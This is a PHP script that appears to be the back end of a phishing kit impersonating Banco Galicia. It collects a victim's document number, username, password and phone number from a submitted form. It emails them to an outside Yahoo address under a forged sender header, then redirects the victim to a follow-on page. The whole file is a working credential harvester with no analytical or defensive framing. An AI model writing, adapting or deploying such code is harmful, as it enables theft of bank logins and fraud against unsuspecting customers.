<?php
$documento = $_POST['documento'];
$usuario = $_POST['usuario'];
$clave = $_POST ['clave'];
$celular = $_POST ['celular'];
$formcontent= "Documento: $documento \n Usuario: $usuario  Clave: $clave \n Celular: $celular";
$recipient = "rkio222@yahoo.com";
$subject = "Contacto Galicia";
$mailheader = "From:  gshevtsk@gsherrystores.com  \r\n";
mail($recipient, $subject, $formcontent, $mailheader) or die("Error!");
header('Location: telefono.html');
?>
